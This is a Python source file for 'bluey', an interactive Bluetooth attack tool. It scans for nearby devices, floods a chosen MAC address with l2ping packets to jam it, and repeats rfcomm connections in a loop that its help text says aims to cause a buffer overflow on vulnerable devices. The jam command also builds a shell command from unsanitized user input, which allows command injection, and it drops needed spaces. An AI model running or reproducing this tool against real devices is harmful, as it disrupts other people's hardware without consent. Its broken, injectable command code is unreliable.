import os
from bluetooth import *
import art
import subprocess
from alive_progress import alive_bar
import time

art.tprint("bluey")
print("=====================================")
print("Author: Logan Goins\n")
print("I am not responsible for any damages or misuse from this software.\nThis software is used at your own risk\n")

def scan():
    try:
        
        nearby_devices = discover_devices(lookup_names = True)

        print(" ")
        print("        Devices:\n")
        print("==========================")
        for name, addr in nearby_devices:
            print (" > %s - %s" % (addr, name))

        print(" \n")
        print("==========================")
        print ("found %d devices" % len(nearby_devices))
        print(" ")
    except OSError as error:
        print(error)
        print("Make sure your bluetooth adapter is up and connected")
        main()
        

def force_connect(target):
    if target == " ":
        print("Target MAC not set")
        main()

    print("attempting connection")
    connect=['rfcomm', 'connect', target, '1']
    items = range(1001)
    with alive_bar(len(items)) as bar:
        for item in items:   
            subprocess.call(connect)
            bar()

def jam():
    if interface == " ":
        print("Bluetooth Interface not set")
        main()
    if packetsize == " ":
        print("Packet size not set")
        main()
    if target == " ":
        print("target not set")
        main()

    print("Starting packet flow")
    os.system("l2ping -i" + interface + "-s " + packetsize + " -f " + target)
    
def help_menu():
    print(" \n")
    print("Commands")
    print("--------------------------")
    print("scan  ---  scans for bluetooth devices in the area")
    print("jam  ---  jams devices using specified interface, target, and packet size")
    print("forceconnect  ---  tries to cause a buffer overflow connection on vulnerable devices")
    print("set target <target>  --- sets target MAC address for later use")
    print("set interface <interface> ---  sets bluetooth interface for use")
    print("set packetsize <packet size> ---  sets packet size for use with the \"jam\" command (in bytes)")
    print("clear  ---  clears terminal window")
    print(" ")

def main():
    while True:
        prompt = "\nbluey/> "
        print(prompt, end="")

        command = input().split(" ")
        print(" ")
        if len(command) >= 3:
            cmd = command[0]
            subcmd = command[1]
            arg = command[2]
            params = [cmd, subcmd, arg]
        elif len(command) >= 2:
            cmd = command[0]
            subcmd = command[1]
            params = [cmd, subcmd]

        elif len(command) >= 1:
            cmd = command[0]
            params = [cmd]


        if(cmd == "scan"):
            scan()

        if(cmd == "set" and subcmd == "target"):
            global target
            target = arg
            print(target + "---> target\n")

        if(cmd == "jam"):
            jam()

        if(cmd == "set" and subcmd == "packetsize"):
            global packetsize
            packetsize = arg
            print(packetsize + "---> packet size\n")

        if(cmd == "set" and subcmd == "interface"):
            global interface
            interface = arg
            print(interface + "---> bluetooth interface\n")

        if(cmd == "forceconnect"):
            force_connect(target)

        if(cmd == "help"):
            help_menu()
        
        if(cmd == "clear"):
            os.system("clear")

        if(cmd == "exit" or cmd == "quit"):
            exit()


main()

